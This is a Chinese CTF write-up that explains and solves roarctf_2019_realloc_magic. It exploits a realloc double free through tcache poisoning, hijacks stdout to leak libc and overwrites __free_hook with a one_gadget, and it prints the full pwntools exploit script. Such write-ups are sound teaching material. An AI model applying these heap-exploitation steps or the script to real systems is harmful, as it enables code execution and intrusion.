[toc]
## roarctf_2019_realloc_magic
这题折腾了一天才做出来，特此记录，希望以后少踩坑。

### 题目分析
#### checksec

首先`checksec`一下，发现保护全开：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214105054.png)

#### 函数分析

然后将题目拖进IDA分析，首先看main函数：
![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214103151.png)
可以看到，main函数并不复杂，一个菜单加上3个选项。

- menu：

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214103547.png)

- re：

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214103647.png)

- fr：

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214103717.png)

- ba：

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214103750.png)

这里需要注意，分配内存函数使用的是`realloc(void* ptr, size_t size)`，这个函数的功能很多，查看源码后发现其功能有：

- 当`ptr == nullptr`的时候，相当于`malloc(size)`， 返回分配到的地址
- 当`ptr != nullptr && size == 0 `的时候，相当于`free(ptr)`，返回空指针
- 当`size`小于原来`ptr`所指向的内存的大小时，直接缩小，返回`ptr`指针。被削减的那块内存会被释放，放入对应的`bins`中去
- 当`size`大于原来`ptr`所指向的内存的大小时，如果原`ptr`所指向的`chunk`后面又足够的空间，那么直接在后面扩容，返回`ptr`指针；如果后面空间不足，先释放`ptr`所申请的内存，然后试图分配`size`大小的内存，返回分配后的指针

可以看到，`realloc`函数功能很多，也很危险，使用不当的话会引来严重的安全问题。

`ba`函数可以将`realloc_ptr`置为空，但是只有一次使用机会，`re`函数会释放内存，但是没有置为空，存在`double free`的漏洞。

题目使用的是`ubuntu 18`的环境，对应的`libc`的版本为`2.27`，考虑使用`tcache attack`。

### 解题思路

漏洞找到了，而一般的`tcache attack`也很简单，就是直接修改`tcache bin chunk`的`next`指针，可以进行任意地址写。所以，初步的解题思路是：

#### 初步解题思路

- 利用`fr`函数进行`tcache dup`
- 修改`chunk`的`next`指针，覆盖`__free_hook`，为`one_gadget`
- 修改后触发`fr`函数，获取`shell`

思路没啥问题，但是中间有几个关键的**问题**：

#### 存在的问题

1. 分配函数是`realloc`，所以如果指针`ptr`不置为空，就无法达到`malloc`的效果，`ptr`所指向的`chunk`要么扩大，要么缩小，要么换一片内存段进行内存分配，没有办法从`bins`里面取出`chunk`
2. 题目里似乎没有泄露地址的函数，要想往`__free_hook`写入`one_gadget`需要`libc`的基地址

#### 问题解决方案

- 回忆一下刚刚总结的`realloc`函数的特点，可以发现，在上图的`re`函数第`7`行，将`realloc_ptr`接收返回后的指针，那么如果`realloc_ptr != 0 && size==0`，就会触发`free(realloc_ptr)`，并且将`realloc_ptr`置为`0`。所以，第一个问题就解决了。
- 当题目没有泄露地址的函数或功能的时候，可以通过劫持`stdout`结构体，修改`flags`和`_IO_write_base`来泄露`libc`中的地址，进而获取到`libc`的基地址。攻击原理就不详述了，这位师傅写的很好：[利用IO_2_1_stdout_泄露信息](http://blog.eonew.cn/archives/1190)。最后需要将`stdout`结构体的`flags`修改为`0x0FBAD1887`，将`_IO_write_base`的最后一个字节覆盖为`0x58`。劫持`stdout`可以借助`main_arena`来操作，只需要修改低字节的几个地址即可。

#### 最终解决思路

由以上分析，可以总结出最终的解题思路为：

- 首先分配一块合适大小的内存块**A**。这段内存用于调用`realloc`往后面扩张，覆写`tcache bin chunk`的`size`和`next`指针。
- 利用`re`函数将`realloc_ptr`指针置为空，然后分配一块大小在`small bin chunk`范围的内存块**B**，如大小为0x80。这是为了之后能得到`unsorted bin`
- 利用`re`函数将`realloc_ptr`指针置为空，然后随意分配一块内存块**C**，用于隔开`top chunk`。
- 利用`re`函数将`realloc_ptr`指针置为空， 申请大小为0x80的内存，得到了刚刚释放的那块内存B。然后利用`fr`函数和`re`函数将`realloc_ptr`释放8次，使得`tcache bin`和`unsorted bin`存在重合，同时`realloc_ptr`所对应的`chunk`的`fd`和`bk`指针，都指向了`main_arena + 96`。
- 重新将内存块A申请回来，然后扩张，修改内存块A下面的内存块B的`size`为`0x51`，这里可以修改为任意在`tcache bin`范围内的值，是为了避免再次调用`realloc(realloc_ptr, 0)`的时候，又改变了`tcache bin`链上的指针。保证能将内存申请到`stdout`附近。
- 然后申请内存到`stdout`结构体附近，修改`flags`和`_IO_write_base`的值。泄露出`libc`的地址，计算得到`__free_hook`地址和`one_gadget`的地址。
- 接下来不能利用`re`来清空`realloc_ptr`指针，程序会挂掉，因为绕不过检查。这里选择使用`ba`函数，来将指针置为空。
- 然后重复上面的1-4步，修改`__free_hook`的值为`one_gadget`，触发`fr`函数，获取`shell`。

### 编写exp

根据最终的解题思路，编写exp并调试，过程记录如下：

定义好函数：

```python
def re(size:int=0, content:bytes=b'\x00'):
    global io
    io.sendlineafter(">> ", '1')
    io.sendlineafter("Size?\n", str(size))
    io.recvuntil("Content?\n")
    if size > 0:
        io.send(content)
    return io.recvuntil("Done\n")

def fr():
    global io
    io.sendlineafter(">> ", '2')
    io.recvuntil("Done\n")

restraint = 1
def ba():
    global io, restraint
    if restraint == 0:
        return
    io.sendlineafter(">> ", '666')
    io.recvuntil("Done\n")
    restraint -= 1
```

执行思路的1-4步：

```python
re(0x30)# 首先申请/释放 为后面覆盖写做准备 A
re(0) # 释放，并把指针置为空

re(0x80) # 申请 B
re(0) # 释放置空

re(0x40) # C
re(0) # 置0 隔开topchunk

re(0x80) # 申请回来 B

for x in range(7): # 释放7次
    fr()

re(0) # 得到unsorted bin 同时指针置空
```

看一下此时的`bins`：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214114100.png)

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214114401.png)

然后修改内存块B的`size`和`next`指针，劫持到`stdout`，同时泄露出地址

```python
re(0x30) # 取出来

# 修改两个字节 最低的一个字节是 0x60
des = int16(input('1 byes:'))
des = (des << 8) + 0x60

re(0x50, p64(0) * 7 + p64(0x51) + p16(des)) # 踩低字节
re(0)

re(0x80)
re(0)

msg = re(0x80, p64(0x0FBAD1887) + p64(0) * 3 + p8(0x58))
leak_addr = u64(msg[:8])

free_hook_addr = leak_addr + 0x5648
```

这里调试的时候可以发现，`_IO_2_1_stdout_`的低两个字节和`main_arena + 96`不同，理论上需要改这两个字节，实际上最后一个字节一直是`0x60`，所以只需要改一个字节就行了。此处为本地调试，可以手动查看要修改的内容，然后填上去。

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214115218.png)

输入`0xb7`后，修改成功：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214115423.png)

然后分配到`stdout`结构体，修改`flags`等，泄露出地址：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214115716.png)

计算一下基地址，`__free_hook`的地址等：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210214120016342.png)

重复一下上面的过程，在`_free_hook`附近写上`one_gadget`即可：

```python
gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = free_hook_addr - 0x3ed8e8 + gadget[1]
ba() # 指针置空

# 重复上面的操作，在free_hook上写one_gadget
re(0x10)
re(0)

re(0x90)
re(0)

re(0x20) # 隔开top chunk
re(0)

# 开始dump0x90
re(0x90)
for x in range(7):
    fr()

re(0)

re(0x10)
re(0x50, p64(0) * 3 + p64(0x51) + p64(free_hook_addr))
re(0)

re(0x90)
re(0)

re(0x90, p64(one_gadget))

# delete
io.sendlineafter(">> ", '2')
io.sendline('cat flag')
io.interactive()
```

之后就可以拿到shell：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214120318.png)



最后贴一下完整的exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
import click
import sys
import os
import time
import functools

FILENAME = '#' # 要执行的文件名
DEBUG = 1 # 是否为调试模式
TMUX = 0 # 是否开启TMUX
GDB_BREAKPOINT = None # 当tmux开启的时候，断点的设置
IP = None # 远程连接的IP
PORT = None # 远程连接的端口
LOCAL_LOG = 1 # 本地LOG是否开启
PWN_LOG_LEVEL = 'debug' # pwntools的log级别设置
STOP_FUNCTION = 1 # STOP方法是否开启


CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

@click.command(context_settings=CONTEXT_SETTINGS, short_help='Do pwn!')
@click.argument('filename', nargs=1, type=str, required=0, default=None)
@click.option('-d', '--debug', default=True, type=bool, nargs=1, help='Excute program at local env or remote env. Default value: True.')
@click.option('-t', '--tmux', default=False, type=bool, nargs=1, help='Excute program at tmux or not. Default value: False.')
@click.option('-gb', '--gdb-breakpoint', default=None, type=str, help='Set a gdb breakpoint while tmux is enabled, is a hex address or a function name. Default value:None')
@click.option('-i', '--ip', default=None, type=str, nargs=1, help='The remote ip addr. Default value: None.')
@click.option('-p', '--port', default=None, type=int, nargs=1, help='The remote port. Default value: None.')
@click.option('-ll', '--local-log', default=True, type=bool, nargs=1, help='Set local log enabled or not. Default value: True.')
@click.option('-pl', '--pwn-log', type=click.Choice(['debug', 'info', 'warn', 'error', 'notset']), nargs=1, default='debug', help='Set pwntools log level. Default value: debug.')
@click.option('-sf', '--stop-function', default=True, type=bool, nargs=1, help='Set stop function enabled or not. Default value: True.')
def parse_command_args(filename, debug, tmux, gdb_breakpoint, ip, 
                       port, local_log, pwn_log, stop_function):
    '''FILENAME: The filename of current directory to pwn'''
    global FILENAME, DEBUG, TMUX, GDB_BREAKPOINT, IP, PORT, LOCAL_LOG, PWN_LOG_LEVEL, STOP_FUNCTION
    # assign
    FILENAME = filename
    DEBUG = debug
    TMUX = tmux
    GDB_BREAKPOINT = gdb_breakpoint
    IP = ip
    PORT = port
    LOCAL_LOG = local_log
    PWN_LOG_LEVEL = pwn_log
    STOP_FUNCTION = stop_function
    # print('[&]', filename, debug, tmux, gdb_breakpoint, ip, port, local_log, pwn_log, stop_function)
    # change
    if PORT:
        DEBUG = 0
        TMUX = 0
        STOP_FUNCTION = 0
        GDB_BREAKPOINT = None
        if IP is None:
            IP = 'node3.buuoj.cn'
    
    if DEBUG:
        IP = None
        PORT = None
    
    # assert
    assert not (FILENAME is None and PORT is None), 'para error'
    assert not (FILENAME is None and DEBUG == 1), 'para error'
    assert not (PORT is not None and DEBUG == 1), 'para error'
    assert not (DEBUG == 0 and TMUX == 1), 'para error'
    
    # print
    click.echo('=' * 50)
    click.echo(' [+] Args info:\n')
    if FILENAME:
        click.echo('  filename: %s' % FILENAME)
    click.echo('  debug enabled: %d' % DEBUG)
    click.echo('  tmux enabled: %d' % TMUX)
    if GDB_BREAKPOINT:
        click.echo('  gdb breakpoint: %s' % GDB_BREAKPOINT)
    if IP:
        click.echo('  remote ip: %s' % IP)
    if PORT:
        click.echo('  remote port: %d' % PORT)
    click.echo('  local log enabled: %d' % LOCAL_LOG)
    click.echo('  pwn log_level: %s' % PWN_LOG_LEVEL)
    click.echo('  stop function enabled: %d' % STOP_FUNCTION)
    click.echo('=' * 50)
    

parse_command_args.main(standalone_mode=False)

if len(sys.argv) == 2 and sys.argv[1] == '--help':
    sys.exit(0)

if DEBUG:
    io = process('./{}'.format(FILENAME))
else:
    io = remote(IP, PORT)

if TMUX:
    context.update(terminal=['tmux', 'splitw', '-h'])
    if GDB_BREAKPOINT is None:
        gdb.attach(io)
    elif '0x' in GDB_BREAKPOINT:
        gdb.attach(io, gdbscript='b *{}\nc\n'.format(GDB_BREAKPOINT))
    else:
        gdb.attach(io, gdbscript='b {}\nc\n'.format(GDB_BREAKPOINT))


if FILENAME:
    cur_elf = ELF('./{}'.format(FILENAME))
    print('[+] libc used ===> {}'.format(cur_elf.libc))

def LOG_ADDR(addr_name:str, addr:int):
    if LOCAL_LOG:
        log.success("{} ===> {}".format(addr_name, hex(addr)))
    else:
        pass

STOP_COUNT = 0
def STOP(idx:int=-1):
    if not STOP_FUNCTION:
        return
    if idx != -1:
        input("stop...{} {}".format(idx, proc.pidof(io)))
    else:
        global STOP_COUNT
        input("stop...{}  {}".format(STOP_COUNT, proc.pidof(io)))
        STOP_COUNT += 1

int16 = functools.partial(int, base=16)

context.update(os='linux', log_level=PWN_LOG_LEVEL, arch='amd64',endian='little')
##########################################
##############以下为攻击代码###############
##########################################

# realloc的特点
def re(size:int=0, content:bytes=b'\x00'):
    global io
    io.sendlineafter(">> ", '1')
    io.sendlineafter("Size?\n", str(size))
    io.recvuntil("Content?\n")
    if size > 0:
        io.send(content)
    return io.recvuntil("Done\n")

def fr():
    global io
    io.sendlineafter(">> ", '2')
    io.recvuntil("Done\n")

restraint = 1
def ba():
    global io, restraint
    if restraint == 0:
        return
    io.sendlineafter(">> ", '666')
    io.recvuntil("Done\n")
    restraint -= 1



re(0x30)# 首先申请/释放 为后面覆盖写做准备
re(0) # 释放，并把指针置为空

re(0x80) # 申请
re(0) # 释放置空

re(0x40)
re(0) # 置0 隔开topchunk

re(0x80) # 申请回来

for x in range(7): # 释放7次
    fr()

re(0) # 得到unsorted bin 同时指针置空
STOP()
re(0x30) # 取出来

# 修改两个字节 最低的一个字节是 0x60
des = int16(input('1 byes:')) # 实际打的时候，需要爆破
des = (des << 8) + 0x60

re(0x50, p64(0) * 7 + p64(0x51) + p16(des)) # 踩低字节
re(0)

re(0x80)
re(0)

msg = re(0x80, p64(0x0FBAD1887) + p64(0) * 3 + p8(0x58))
leak_addr = u64(msg[:8])


free_hook_addr = leak_addr + 0x5648
LOG_ADDR('free_hook_addr', free_hook_addr)

gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = free_hook_addr - 0x3ed8e8 + gadget[1]
ba()
re(0x10)
re(0)

re(0x90)
re(0)

re(0x20)
re(0)

# 开始dump0x90
re(0x90)
for x in range(7):
    fr()

re(0)

re(0x10)
re(0x50, p64(0) * 3 + p64(0x51) + p64(free_hook_addr))
re(0)


re(0x90)
re(0)

re(0x90, p64(one_gadget))

# delete
io.sendlineafter(">> ", '2')
io.sendline('cat flag')
io.interactive()
```

注意：在实际打的时候，需要爆破一个字节。



### 总结

做完这道题后总结如下：

- `realloc`功能比较多，使用需要谨慎
- 可利用修改`stdout`结构体的`flags`和`_IO_write_base`来泄露`libc`中的地址
- 利用`main_arena`来劫持`stdout`结构体

### exp说明

这份exp是我专门用来刷BUUCTF上面的题目的，有需要的小伙伴可以拿去用。主要是利用`click`包装了一下命令行参数，方便本地调试和远程攻击。

- 输入`python3 exp.py -h`可以获取帮助：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214120714.png)

调试的时候，首先需要进入`tmux`，然后可以指定是否分屏调试，以及断点设置等。目前可支持设置函数地址断点和函数名断点。

- 输入`python3 expcopy.py roarctf_2019_realloc_magic -t 1 -gb puts`是这样的：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210214121108.png)

可以开始调试，并且断在`puts`函数处。

- 如果本地调通了需要远程打直接输：`python3 exp.py filename -p 25622`就可以了。这一题不能直接远程打，需要改下脚本进行爆破。

也可以自己定制命令，省去做题输入命令，改脚本的时间。